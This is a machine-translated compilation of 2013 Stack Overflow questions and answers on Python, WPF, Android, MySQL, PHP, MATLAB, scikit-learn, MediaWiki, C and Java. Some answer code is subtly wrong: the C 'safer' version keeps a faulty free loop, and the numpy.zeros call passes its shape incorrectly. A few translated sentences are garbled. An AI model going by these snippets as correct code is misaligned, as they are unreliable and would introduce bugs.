在 Python 中，我想要一个`list`包含给定数量的表单子列表`[0,0]`。例如：

```
>>> myLen = 2
>>> myList = [[0,0]] * myLen
>>> myList
[[0, 0], [0, 0]] 
```

事实证明，每个子列表总是指向同一个元素，因此修改一个会自动修改另一个。

```
>>> myList[0][0] = 2
>>> myList
[[2, 0], [2, 0]] 
```

这是为什么？我该如何避免这种行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:42:15.020

使用列表推导：

```
myList = [[0,0] for _ in range(myLen)] 
```

创建单独的子列表。

与列表相乘时，不会复制内部列表，仅复制*对子列表的引用*。你基本上这样做：

```
myList = [[0,0]]
for _ in range(myLen - 1):
    myList.append(myList[0]) 
```

另一方面，列表推导式执行为每次循环迭代创建子列表的*表达式*，因此在每次运行时都会创建一个全新的列表：

```
myList = []
for _ in range(myLen):
    myList.append([0,0]) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:44:03.323

也许你可以使用 numpy：

```
import numpy
matrix = numpy.zeros(myLen, 2) 
```

来源：[http ://docs.scipy.org/doc/numpy/reference/generated/numpy.zeros.html](http://docs.scipy.org/doc/numpy/reference/generated/numpy.zeros.html)

# .net - 调整 TextBlock 中的上划线填充

> ID：15526690
> 
> 赞同：4
> 
> 时间：2013-03-20T14:41:40.220
> 
> 标签：.net, wpf, xaml

我`<Span TextDecorations="Overline" BaselineAlignment="Bottom">`在 TextBlock 内使用：

```
<TextBlock HorizontalAlignment="Left" VerticalAlignment="Top" 
           TextWrapping="Wrap" Width="276">
    Hello world. This is some text. This is an 
    <Span TextDecorations="Overline" BaselineAlignment="Bottom">
        OVERLINE
    </Span>
</TextBlock> 
```

生产：

![截屏](../Images/441c5a73e18674b4e98ea3c133291b4a.png)

有没有办法减少字符顶部和上划线之间的空间？例如，我更喜欢：

![在此处输入图像描述](../Images/a530f11da7bdde2d5f3de5d3ef4462b0.png)

非常微妙的下移，我知道。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T17:10:04.320

主要思想是根据您的特定需求创建自己的**TextDecoration**。

```
<TextBlock HorizontalAlignment="Left" VerticalAlignment="Top" 
           TextWrapping="Wrap" Width="276">
    Hello world. This is some text. This is an
    <Span BaselineAlignment="Bottom">
        <Span.TextDecorations>
            <TextDecoration Location="OverLine" PenOffset="1" PenOffsetUnit="Pixel" />
        </Span.TextDecorations>
        OVERLINE
    </Span>
</TextBlock> 
```

# android - Indeterminate ProgressBar 让我的后台线程真的很慢

> ID：15526697
> 
> 赞同：1
> 
> 时间：2013-03-20T14:42:00.503
> 
> 标签：android, multithreading, performance, progress-bar

我有一个后台工作繁重的应用程序。为了让我的 UI 保持活跃（并避免 ANR），我有一个不确定的 ProgressBar，我在后台工作之前显示并在完成时隐藏它。

这是我的进度条在我的活动的 xml 中声明的方式：

```
<ProgressBar
    style="?android:attr/progressBarStyleHorizontal"
    android:layout_width="match_parent"
    android:indeterminate="true"
    android:visibility="gone" /> 
```

我在后台操作之前和之后切换可见性：

```
this.runOnUiThread(new Runnable() {
    @Override
    public void run() {
        Activity.this.progress.setVisibility(View.VISIBLE);
    }
});

this.runOnUiThread(new Runnable() {
    @Override
    public void run() {
        Activity.this.progress.setVisibility(View.GONE);
    }
}); 
```

在我的 Activity 的构造函数上：

```
this.progress = (ProgressBar) findViewById(R.my_activity.progress_id); 
```

我的后台工作非常繁重（包括本地调用），但我创建了一个新的 Runnable 来完成这项工作。

问题是：使用progressBar，后台线程完成工作的时间增加了大约每秒300ms。当我运行 traceview 时，我可以看到每次我的 ProgressBar 刷新时，它都会停止后台线程来更新视图。

我尝试了两种方法：

1.  将后台线程的优先级设置为 MAX_PRIORITY。
2.  创建刷新率为 300 毫秒（默认为 50 毫秒）的自定义动画。

将这两者结合起来，我的一项操作的时间从 5900 毫秒到 4700 毫秒，但是由于刷新率较低，进度条不流畅，恐怕将后台线程优先级设置为 MAX 是不安全的。

还有什么我可以做的吗？

* * *

编辑：

AsyncTask 现在真的不可能重构了。

我使用 Chuck Norris 的解决方案更新的代码：

```
Activity.this.getHandler().sendEmptyMessage(
            MyMessages.SHOW_PROGRESS_BAR);

Activity.this.getHandler().sendEmptyMessage(
            MyMessages.HIDE_PROGRESS_BAR); 
```

和

```
private Handler handler = new Handler() {
    @Override
    public void handleMessage(android.os.Message msg) {

        switch (msg.what) {
        case MyMessages.SHOW_PROGRESS_BAR:
            Activity.this.progress.setVisibility(View.VISIBLE);
            break;
        case MyMessages.HIDE_PROGRESS_BAR:
            Activity.this.progress.setVisibility(View.GONE);
            break;
        default:
            break;
        }

    };
}; 
```

这确实改进了我的应用程序，我不再需要将线程优先级设置为 Max，这是我的目标之一。

但我仍然想将我的动画恢复为 Android 的默认设置（每 50 毫秒刷新一次 ProgressBar）。当我这样做时，我在基准操作中损失了 1 秒。

我的基准：

同一操作的平均时间：

1.  没有处理程序和android的默认进度条：5.1s
2.  带handler和android的默认进度条：4.6s（线程优先到MAX的结果相同）
3.  处理程序和自定义动画每 300 毫秒刷新一次：3.5 秒
4.  处理程序和自定义动画每 150 毫秒刷新一次：3.8 秒

任何的想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:53:56.953

尝试在活动中打开中间进度条，例如在`onClickListener`. 做同样的事情来关闭它。

花费的额外时间可能是分配和启动新线程的时间。这就是您使用控制进度条的新 Runnable() 所做的事情。

不要从它自己的线程控制进度条。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T15:05:22.927

所以[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)是运行你描述的那种工作的公认机制

```
public class MyActivity extends Activity {
    ProgressBar mProgressBar = (ProgressBar) findViewById(R.my_activity.progress_id);
    DoTheWorkClass myInstanceOfClassThatDoesTheWork = new Object();

    class MyAsyncTask extends AsyncTask<Void, Void, Integer> {

        @Override
        protected void onPreExecute() {
            mProgressBar.setVisibility(View.VISIBLE);
        }

        @Override
        protected void onPostExecute(Integer result) {
            mProgressBar.setVisibility(View.GONE);
        }

        @Override
        protected Integer doInBackground(Void... params) {
            return myInstanceOfClassThatDoesTheWork.doTheWork();
        }

    }
} 
```

# mysql - MYSQL 查询问题和子查询

> ID：15526698
> 
> 赞同：0
> 
> 时间：2013-03-20T14:42:01.070
> 
> 标签：mysql, select, subquery

我正在尝试从 product_description 中获取所有内容，并从 order_product 中获取描述。

事情是，当我在 order_product 中没有结果时，我只是没有得到任何结果。（即使 product_description 中有内容）

我可能需要一个子查询，但我不知道该怎么做。

任何想法将不胜感激

```
SELECT *
FROM
  " . DB_PREFIX . "product_description
  INNER JOIN " . DB_PREFIX . "order_product ON (" . DB_PREFIX . "product_description.product_id = " . DB_PREFIX . "order_product.product_id)
WHERE
  order_id = '" . (int)$order_id . "'
AND " . DB_PREFIX . "product_description.language_id = 2") 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:56:17.483

这是因为如何`INNER JOIN`工作。内连接将表 A 中的每一行与表 B 中的每一行进行比较，并且只返回与过滤条件匹配的行。

如果您在 order_product 中没有任何行，那么您的匹配将失败并且内部连接将不返回任何内容。

你想要的是`OUTER JOIN`. 具体来说，你想要一个`LEFT JOIN`

尝试这个：

```
SELECT *
FROM
  " . DB_PREFIX . "product_description
  LEFT JOIN " . DB_PREFIX . "order_product ON (" . DB_PREFIX . "product_description.product_id = " . DB_PREFIX . "order_product.product_id)
WHERE
  order_id = '" . (int)$order_id . "'
AND " . DB_PREFIX . "product_description.language_id = 2") 
```

现在会发生的是，您将从 product_description 中获取与 order_id = $order_id 匹配的所有行。如果 order_product 中没有与 product_id 匹配的行，则 order_product 中的字段将为`NULL`

另外，我会使用别名来清理您的查询。您可以命名一个表`AS` 来创建快捷方式，并且您应该只选择您真正想要的列（正如您在描述中所说

```
SELECT pd.*, op.description
FROM " . DB_PREFIX . "product_description AS pd
    LEFT JOIN " . DB_PREFIX . "order_product as op
    ON (pd.product_id = op.product_id)
WHERE
    pd.order_id = '" . (int)$order_id . "'
    AND pd.language_id = 2 
```

此外，在将变量插入到查询中时要非常小心，就像使用 $order_id 一样。如果这是用户提交的数据，您可能会遇到一些令人讨厌的惊喜。

我会使用您用来处理此问题的任何语言和 SQL 库来研究准备好的语句。我会提供示例，但我不知道您使用的是什么语言或 API。

# php - 为什么找到脚本时找不到类？

> ID：15526699
> 
> 赞同：1
> 
> 时间：2013-03-20T14:42:03.773
> 
> 标签：php, namespaces

发生了一些奇怪的事情。

以下是来自的片段`view_reminders.php`：

```
<?php 
  namespace reminder;
  require_once('./reusable/reminders.php');
?>

some HTML...

<?php  
    $reminders = new Reminders(); # STATEMENT THAT THROWS AN ERROR : LINE 23
    $reminder_details = $reminders->get_reminders();
    foreach($reminder_details as $reminder) {
        echo $reminder;
    }
?> 
```

在上面的脚本中，语句`$reminders = new Reminders()`抛出了一个错误：`Fatal error: Class 'reminder\Reminders' not found in E:\Installed_Apps\xampp\htdocs\remind\view_reminders.php on line 23`。

我不明白这个错误。以下是来自的片段`reminders.php`：

```
<?php
namespace reminder;
namespace connection;
require_once('./reusable/connection.php');

Class Reminders{
    private $user_info;
    private $userID;
    private $reminder_info;
    private $reminder_count;

            .
            .
            .
    } 
```

现在为什么在`Reminders`找到脚本时找不到类`reminders.php`？

*注意：目录结构：*

```
 +--->resuable
          +---->connection.php
           ---->reminders.php
     ---->view_reminders.php 
```

`view_reminders.php`就在外面`connection.php`，`reminders.php`在`reusable`目录里面。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:47:08.280

您将命名空间设置为`connection`. 你可以使用[多个命名空间](http://php.net/manual/en/language.namespaces.definitionmultiple.php)，但你必须这样写：

```
<?php
namespace connection;
require_once('./reusable/connection.php');

namespace reminder;
Class Reminders{
    private $user_info;
    private $userID;
    private $reminder_info;
    private $reminder_count;

            .
            .
            .
    } 
```

另请查看手册的链接，了解使用方括号使用多个命名空间的推荐方法：

```
<?php
namespace connection {
require_once('./reusable/connection.php');
}

namespace reminder {
Class Reminders{
    private $user_info;
    private $userID;
    private $reminder_info;
    private $reminder_count;

            .
            .
            .
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:44:57.623

提醒类上的双重命名空间？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:47:23.067

你真的可以那样使用两个命名空间吗？？...据我所知，在这段代码中：

```
namespace reminder;
namespace connection; 
```

下一个代码将用于连接命名空间，并且提醒为空

尝试从那里删除连接命名空间。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:48:44.703

根据[PHP：在同一个文件中定义多个命名空间](http://www.php.net/manual/en/language.namespaces.definitionmultiple.php)：

> 多个命名空间也可以在同一个文件中声明。

在“reminders.php”中，您已经按照该页面上描述的语法声明了多个命名空间。我建议后一个 ( `connection`) 是`Reminders`创建类的命名空间。

# matlab - 使用 Matlab 确定拍摄照片的确切时间

> ID：15526700
> 
> 赞同：0
> 
> 时间：2013-03-20T14:42:06.243
> 
> 标签：matlab

我有一个精度问题。我在实验期间拍摄了许多图像（照片）。我想标记这张照片是在情节上拍摄的时间。要获取我正在使用的文件信息：

```
fileinfo = dir('myfile.jpg')

fileinfo = 
   name: 'myfile.jpg'
   date: '16-Mar-2006 13:34:01' %My problem is here!!
  bytes: 251
  isdir: 0
datenum: 7.3275e+005 
```

这些照片是连续快速拍摄的，我想获得小数精度，但 Matlab 将其四舍五入到最接近的秒数。任何想法如何获得类似`13:34:01.34`. 是不是`datenum`更准确？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:29:38.837

几点建议

1.  绘制`datenum`所有照片的值，看看它是否有意义

    ```
    >> fls = dir( '*.jpg' ); % list all files
    >> plot( [fls(:).datenum], '-+'); % see if all images has unique datenum 
    ```

2.  您可能在[exif中存储了其他信息](http://www.mathworks.com/help/matlab/ref/exifread.html)

    ```
    >> xif = exifread( 'myfile.jpg' ) 
    ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T15:40:00.550

您是否尝试过使用命令`imfinfo`而不是返回的信息`dir`？`imfinfo`返回一个包含图像文件的 EXIF 数据的结构，我相信它在字段中包含有关拍摄图像时间的更详细信息`ImageModTime`。

在旧版本的 MATLAB 中，使用命令`exifread`而不是`imfinfo`.

# python - scikits-learn svm SVC 简单问题

> ID：15526702
> 
> 赞同：1
> 
> 时间：2013-03-20T14:42:11.083
> 
> 标签：python, svm, scikit-learn, svc

我有一个问题已解决，但我想知道我是否正确。

在 scikit 的关于 SVM SVC 的学习文档中，有一个通过在类中使用权重来管理不平衡数据的示例。

他们举了一个例子，在 svm.SVC() 中通知类权重

```
 wclf = svm.SVC(kernel='linear', class_weight={1: 10}) 
```

但如果在源代码上重现此命令，我会收到以下错误：

```
 wclf = svm.SVC(kernel='linear', class_weight={1: 10})
    TypeError: __init__() got an unexpected keyword argument 'class_weight' 
```

但是如果将 classes_weight 放在 fit() 函数上，问题就解决了：

```
 wclf.fit(X, y, class_weight={1: 10}) 
```

我是对的吗？有人遇到过这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-01-17T00:09:06.543

关键字“class_weight”尚未在您的 SVC sklearn 版本中实现，但它适用于 SVC.fit()。sklearn 更新它们的功能有时比你想象的要慢，而且你正在阅读的文档可能是 /dev/ 或 /stable/ 而不是你的版本。

# mediawiki - MediaWiki 中的自动顺序文章命名

> ID：15526708
> 
> 赞同：2
> 
> 时间：2013-03-20T14:42:29.650
> 
> 标签：mediawiki, semantic-mediawiki

我正在尝试向公司 wiki 添加一个部分，该部分将用作基于 Documentum 的数据仓库的一种前端（因为没有搜索功能并且内部组织很差）。这个想法是为每个文档创建一个带有元数据和直接链接的文章存根，并使用 Semantic Mediawiki 跟踪和组织系统中的文章。

我正在使用语义表单来管理文章创建（在使用 API 从一些电子表格进行初始推送之后），但我也想自动化文章命名，以便系统从头到尾掌握用户的手。所有的标题都将是 MBMA-00001 之类的东西，所以我想要 MBMA 页面上的一个按钮，按下该按钮时，将搜索 Category:MBMA，确定系统中当前的最大编号 MBMA-n，并将用户带到已输入 MBMA-n+1 作为标题的语义表单模板。

[InputBox](http://www.mediawiki.org/wiki/Extension%3aInputbox)、[CreateBox](http://www.mediawiki.org/wiki/Extension%3aCreateBox)和[CreateArticle](http://www.mediawiki.org/wiki/Extension%3aCreateArticle)等扩展似乎不支持此功能，但是我可以添加另一个扩展来支持此功能吗？还是我必须弄清楚如何编写自己的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:20:25.337

我要说你可能需要创建自己的，因为你的要求看起来很专业，但后来我遇到了[DPL Page Name S/N Maker](http://www.mediawiki.org/wiki/Extension%3aDPL_Page_Name_S/N_Maker)扩展，它似乎与它们完全匹配。

还有一个[使用 Semantic Forms 的扩展变体](http://www.mediawiki.org/wiki/Extension%3aDPL_Page_Name_S/N_Maker_%28using_SemanticForms%29)，您可能更喜欢它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-29T17:28:23.993

上面链接的模板正是我所需要的，但实际上并没有像写的那样工作。对于将来有此需求的任何其他人，这是一个清理和更正的版本，它删除了有问题的字符串函数并完美运行：

```
{{#if: {{{form|}}}
  |  {{#ifexist: Form:{{{form|}}} 
       |
       | <strong class="error">Warning! The form "{{{form|}}}" may not be a valid form name!</strong>
     }}
  |
}}<!---
-->{{#if: {{{form|}}}
     | {{#ifeq: {{lc:{{NS:{{{namespace|}}} }} }} 
         | {{lc:{{{namespace|}}} }}
         | 
         | <strong class="error">Warning! "{{{namespace}}}" may not be a valid namespace name!</strong>
       }}
     |
   }}<!---
-->The next document number is '''<!--
-->{{#if: {{{namespace|}}} | {{{namespace|}}}: }}{{{prefix|}}}<!--
   -->{{padleft:<!----------- (X+1)                         =>  0000(X+1) 
      -->{{#expr:<!---------- 0000X+1                       =>  (X+1)
         -->{{replace|<!----- "Namespace:prefix0000X"       =>  "0000X" 
            -->{{replace|<!-- "*[[Namespace:prefix0000X]]"  =>  "Namespace:prefix0000X"
               -->{{#dpl:<!-- return pages named "*[[Namespace:prefix0000X]]"
                  -->titleregexp =^{{{prefix|}}}[0-9]{{{{pad|5}}}}$<!--
                  -->| namespace = {{{namespace|}}}<!--
                  -->| order = descending<!--
                  -->| mode = userformat<!--
                  -->| format = ,%PAGE%<!--
                  -->| noresultsheader = {{padleft:0|{{{pad|5}}}|0}}<!--
                  -->| count = 1
                  }}
               |/^([^{{!}}]+\{{!}}){1}([^\]]+).*/  
               |\2
               }}
            | {{#if: {{{namespace|}}} | {{{namespace|}}}:}}{{{prefix|}}}
            |
            }}
         +1
         }}
     | {{{pad|5}}}
     | 0
     }}'''
----
{{#if: {{{form|}}}
  | {{#forminput: {{{form|}}}
      | {{{width|20}}}
      | {{{prefix|}}}<!--
      -->{{padleft:<!----------- (X+1)                         =>  0000(X+1) 
         -->{{#expr:<!---------- 0000X+1                       =>  (X+1)
            -->{{replace|<!----- "Namespace:prefix0000X"       =>  "0000X" 
               -->{{replace|<!-- "*[[Namespace:prefix0000X]]"  =>  "Namespace:prefix0000X"
                  -->{{#dpl:<!-- return pages named "*[[Namespace:prefix0000X]]"
                     -->titleregexp =^{{{prefix|}}}[0-9]{{{{pad|5}}}}$<!--
                     -->| namespace = {{{namespace|}}}<!--
                     -->| order = descending<!--
                     -->| mode = userformat<!--
                     -->| format = ,%PAGE%<!--
                     -->| noresultsheader = {{padleft:0|{{{pad|5}}}|0}}<!--
                     -->| count = 1
                     }}
                  |/^([^{{!}}]+\{{!}}){1}([^\]]+).*/  
                  |\2
                  }}
               |{{#if: {{{namespace|}}} | {{{namespace|}}}:}}{{{prefix|}}}
               |
               }}
            +1
            }}
        | {{{pad|5}}}
        | 0
        }}
     | {{{buttonlabel|Add}}}
     | {{#if: {{{namespace|}}} | namespace = {{{namespace|}}} }}  
     }}
  | <includeonly><strong class="error">Warning! You haven't specified a SemanticForm for page creation! Please specify a SemanticForm name.</strong></includeonly>
}}<noinclude>{{documentation}}</noinclude> 
```

和文档子页面：

```
{{documentation subpage}}
{{intricate template}}
== Parameters ==

All parameters to the template are optional.

{| class="wikitable"
|- 
! form
| Specifies a SemanticForm name, which will handle the pages you create.
|- 
! namespace
| Specifies a Namespace, which the new page will belong to.
|- 
! prefix
| Specifies a title fragment, which will prefix the generated number
|- 
! pad
| The number of digits required in the page number. The default value is "5".
|- 
! width
| Sets the width of the input box. The default value is "20".
|- 
! buttonlabel
| Sets the text of the Create button. The default value is "Add".
|}

== Example ==

<pre><nowiki>{{DPLSNMakerSF
 | form        = MBMA Document
 | namespace   =
 | prefix      = MBMA-
 | pad         = 5
 | width       = 30
 | buttonlabel = Create
}}
</nowiki></pre>

== See also ==

[[mw:extension:DPL Page Name S/N Maker (using SemanticForms)]] 
```

# c# - wpf MvvM 命令数据上下文问题

> ID：15526715
> 
> 赞同：0
> 
> 时间：2013-03-20T14:42:57.563
> 
> 标签：c#, wpf, mvvm, model-binding, command-pattern

我用谷歌搜索了所有我能找到的东西，但找不到我要找的东西。我有几个问题...

这是我的代码结构：

我的命令类：

```
 public class BrowseCommand : ICommand 
 {
   //Code here
 } 
```

内部视图模型：

```
public class ExampleViewModel
{
    public ExampleViewModel()
    {
        BrowseCommand = new BrowseCommand();
    }

    public ICommand BrowseCommand
    {
        get;
        private set;
    }
  //More Code...
} 
```

MainWindow.xaml.cs：

```
 public partial class MainWindow : Window
{
    public MainWindow()
    {
        InitializeComponent();
        DataContext = new ExampleViewModel();
    }
} 
```

MainWindow.xaml：

```
Window x:Class="Ship32RcParser.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="MainWindow" Height="350" Width="525" >

   <Grid>
       <Button  Content="Browse" Command="{Binding BrowseCommand}"/>
       <Button  Content="Search" Command="{Binding I_NEED_HELP_HERE}"  />
   </Grid>
</Window> 
```

我知道我的浏览器工作正常，因为 MainWindow.xaml.cs 有

```
DataContext = new ExampleViewModel(); 
```

但是我不喜欢那样

1.  我不想在 .cs 文件中有任何内容
2.  我如何拥有多个数据上下文 - 意思是如果我想从不同的 ViewModel 类中获得命令......我知道它可能但它会有点难看......

当我在寻找解决方案时，我遇到了依赖项。例如我可以在我的 xaml 文件中做这样的事情

```
xmlns:local="clr-namespace:myMvvMwpfProj.ViewModel" 
```

然后使用“本地”。然而，当我尝试它并没有像我预期的那样工作......我还看到了类似的东西

```
xmlns:local="using:myMvvMwpfProj.Command" 
```

有人也可以解释一下吗？“本地”是否让我可以访问课程？如果我有 CommandA、CommandB、CommandC 类。我应该能够做 local:CommandA.ExecuteFoo 吗？

我想最大的问题是我如何引用/访问来自不同对象的属性。在 Xaml 中

谢谢大家

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T15:02:04.557

WPF 中的`DataContext`数据层位于 UI 层之后。绑定用于从数据层查询属性以在 UI 层中使用。

如果您的 UI 层将有两个按钮（浏览和搜索），那么您通常希望您的数据层有两个命令：`BrowseCommand`和`SearchCommand`

可以编写一个查询当前以外的其他内容的绑定`DataContext`。实际上，我昨天为此写了另一个 SO[答案](https://stackoverflow.com/a/15500436/302677)，其中包含一些示例。

最常见的方法是`ElementName`or `RelativeSource`，它将在 VisualTree 中找到另一个 UI 元素，因此您可以将其用作绑定的源，如下所示：

```
<Button Command="{Binding ElementName=SomeXAMLObjectName, 
                          Path=DataContext.BrowseCommand}" />

<Button Command="{Binding 
            RelativeSource={RelativeSource AncestorType={x:Type Window}}, 
            Path=DataContext.BrowseCommand}" /> 
```

第三个选项是在 XAML 中创建一个对象的实例`<XXXX.Resources>`，并使用它将源设置为该实例`x:Key`，如下所示：

```
<Window.Resources>
    <local:MyViewModel x:Key="MyViewModelInstance" />
</Window.Resources>

...

<Button Command="{Binding Source={StaticResource MyViewModelInstance}, 
                          Path=BrowseCommand}"> 
```

您还可以将绑定的`Source`属性设置为静态对象，这样您就不需要在 中创建对象的实例`.Resources`，如下所示：

```
<Button Command="{Binding Source={x:Static local:MyStaticClass.BrowseCommand}}"> 
```

但这仅适用于静态类，因为它实际上不会为绑定创建对象的新实例。

回答你的另一个问题，当你写

```
xmlns:local="clr-namespace:myMvvMwpfProj.ViewModel" 
```

您是在告诉 XAML 使用“本地”作为“myMvvMwpfProj.ViewModel”（xmlns 代表[XML 命名空间](https://stackoverflow.com/q/1181888/302677)）的快捷方式，因此类似于`local:MyStaticClass.BrowseCommand`绑定到`myMvvMwpfProj.ViewModel.MyStaticClass.BrowseCommand`.

如果您是 WPF 和 MVVM 的新手，我实际上建议您查看我专门为新的 WPF/MVVM 用户编写的几篇博客文章。

*   [你说的这个“DataContext”是什么？](http://rachel53461.wordpress.com/2012/07/14/what-is-this-datacontext-you-speak-of/)
*   [一个简单的 MVVM 示例](http://rachel53461.wordpress.com/2011/05/08/simplemvvmexample/)

它们将帮助您更好地了解 WPF 和 MVVM 模式的工作原理。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:47:06.027

您可以在视图中设置数据上下文`<Grid DataContext = "{Binding}">`

每个视图有 1 个视图模型，但可以有许多绑定命令！我建议你查看 Josh Smiths RelayCommand，因为这让这变得容易多了！指南在这里：

创建一个新类

```
class RelayCommand : ICommand
{
    private Action<object> _action;

    public RelayCommand(Action<object> action)
    {
        _action = action;
    }

    #region ICommand Members

    public bool CanExecute(object parameter)
    {
        return true;
    }

    public event EventHandler CanExecuteChanged;

    public void Execute(object parameter)
    {
            _action(parameter);
    }

    #endregion
} 
```

在你的 ViewModel

```
 public ICommand BrowseCommand {get; set;}
    public ICommand SearchCommand {get; set;}

    public ExampleViewModel()
    {
        this.BrowseCommand = new RelayCommand(new action<object>(MethodNameEnteredHere);
        this.SearchCommand = new RelayCommand(new action<object>(OtherMethodNameEnteredHere);
    } 
```

所以，你的 xaml 将是

```
<Grid DataContext = "{Binding}">
       <Button  Content="Browse" Command="{Binding BrowseCommand}"/>
       <Button  Content="Search" Command="{Binding SearchCommand}"  />
 </Grid> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:51:33.810

如果您希望您的视图使用来自各种视图模型的对象，您将必须：

1.  在您的主 ViewModel 中有一些实例用于您想要使用的其他视图模型，因此您的绑定将类似于 {Binding AlternativeViewModelInstance.NewCommand}

2.  在视图中找到需要绑定到不同数据上下文的区域，并将它们分成不同的视图-视图模型对。

# c - 释放具有 char 指针的结构数组

> ID：15526716
> 
> 赞同：-1
> 
> 时间：2013-03-20T14:42:58.350
> 
> 标签：c, pointers, struct, char, free

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct
{
int id;
char *name;
char *lastname;
} student_type;
typedef struct
{
student_type list[15];
} student_list_type;
void get_students(FILE *input,char *filename,student_list_type *student_list);
int main()
{
printf("Hello world!\n");
student_list_type std_list;
student_list_type *std_list_p=&std_list;
 FILE *input;
get_students(input,"students.txt",std_list_p);
return 0;
}
void get_students(FILE *input,char *filename,student_list_type *student_list)
{

int i=0;
int j=0;
input=fopen(filename,"r");
printf("filename is %s",filename);
while(fscanf(input,"%d",&student_list->list[i].id)==1)
{
    student_list->list[i].name=(char *) malloc(15);
    student_list->list[i].lastname=(char *) malloc(15);
    fscanf(input,"%s",student_list->list[i].name);
    fscanf(input,"%s",student_list->list[i].lastname);
    i++;
}

for(j=0; j<i+1; j++)
{
    free(student_list->list[i].name);
    free(student_list->list[i].lastname);
}
free(student_list->list);
fclose(input);
} 
```

我认为我在释放部分代码方面失败了。我知道我应该先释放元素然后整个数组，但我可能学错了方法。无论如何，这段代码不会给出错误消息，但有时会在获取所有学生列表后崩溃文本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:40:13.930

首先，您不检查 fopen 是否成功，如果失败 fscanf 仍会尝试打开变量输入，但在这种情况下将为 NULL。

以及为什么要声明“文件*输入；” 主要？如果你在下一刻将它传递给你的函数“get_student”。为什么不直接在函数中声明呢？

此代码更安全

```
void get_students(char *filename,student_list_type *student_list)
{
    int i=0;
    int j=0;

    FILE * input;

    input=fopen(filename,"r");
    printf("filename is %s",filename);   

    if((input = fopen("students.txt","r")) == NULL)
    {
        fprintf(stderr, "\nFile could not be open\n");
    }
    else
    {
        while(fscanf(input,"%d",&student_list->list[i].id)==1)
        {
            student_list->list[i].name=(char *) malloc(15);
            student_list->list[i].lastname=(char *) malloc(15);
            fscanf(input,"%s",student_list->list[i].name);
            fscanf(input,"%s",student_list->list[i].lastname);
            i++;
           }

            for(j=0; j<i+1; j++)
            {
                free(student_list->list[i].name);
                free(student_list->list[i].lastname);
            }

            fclose(input);
        }
} 
```

最后你不需要释放这个

```
free(student_list->list); 
```

因为 student_list 没有在堆上分配。

# java - java.text.ParseException: Unparseable date: "20-Mar-2013" jar 通过批处理从 php 执行

> ID：15526719
> 
> 赞同：0
> 
> 时间：2013-03-20T14:43:06.693
> 
> 标签：java, php, batch-file

我正在从执行 java jar 文件的 php 执行批处理文件。当我正常运行命令时它运行良好，但是当我通过 php 执行它时。它给出了上述错误。

有人可以帮忙吗？

爪哇：

```
 SimpleDateFormat sdf = new SimpleDateFormat("dd-MMM-yyyy");

        //get current date time
        //tdt = new java.util.Date();
        Calendar c = Calendar.getInstance();
        try {
            tdt= sdf.parse(startdate);
        } catch (ParseException ex) {
            Logger.getLogger(ReportExporter.class.getName()).log(Level.SEVERE, null, ex);
        } 
```

PHP：

```
 $command ="cmd /c ".EXPORT_BATCH_PATH." ".$fromdate." ".$todate." &";
    echo $command;
    $result = system($command, $output); 
```

或者：

```
 $command ="cmd /c ".EXPORT_BATCH_PATH." ".$fromdate." ".$todate." &";
    echo $command;
    $result = exec($command, $output); 
```

当我手动运行上面的 echo $command 值时，它运行正常。但通过 php 执行给出错误。

我的 PHP 脚本包含这一行；

```
<?php header('Content-type: text/html; charset=utf-8'); 
setlocale(LC_ALL, 'en_US');?> 
```

文字编码有问题吗？？

请查看接受的答案。下面的行解决了我的问题；

```
 java -Duser.language=en -Duser.region=US -Dfile.encoding=UTF-8 -jar c:\Progra~1\MyApplication\MyApplication.jar -exportfromto %1 %2 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:53:18.217

`SimpleDateFormat`您构造的`dd-MMM-yyyy`用作日期格式。这要求`$fromdate`和`$todate`是以相同约定格式化的文本字符串。

如果您以某种可识别区域设置的方式打印它们，则解析可能会失败。您的 PHP 脚本应通过[`strftime("%d-%b-%Y")`](http://php.net/manual/en/function.strftime.php). 您还希望 PHP 和 Java 程序使用相同的语言环境，因为`Mar`它是*March*的缩写形式，英语语言环境（例如意大利语，但此字符串绝对取决于语言环境）。您将一个`Locale`对象传递给Java 端的`SimpleDateFormat` [构造函数](http://docs.oracle.com/javase/6/docs/api/java/text/SimpleDateFormat.html#SimpleDateFormat%28java.lang.String,%20java.util.Locale%29)[`setlocale()`](http://php.net/manual/en/function.setlocale.php)，并作为 PHP 的竞争对手。

顺便说一句，在调用外部程序时，请始终记住[转义输入](http://www.php.net/manual/en/function.escapeshellarg.php)以避免空格和其他特殊字符（这可能不是您的情况，但这是一个有用的一般建议，因为它经常被遗忘并导致意外错误）

# c++ - 增强串行通信，COM 端口被拒绝并出现错误“打开：访问被拒绝”

> ID：15526725
> 
> 赞同：0
> 
> 时间：2013-03-20T14:43:10.957
> 
> 标签：c++, boost, serial-port

我有一个简单的程序，Boost 库，构建和链接等。

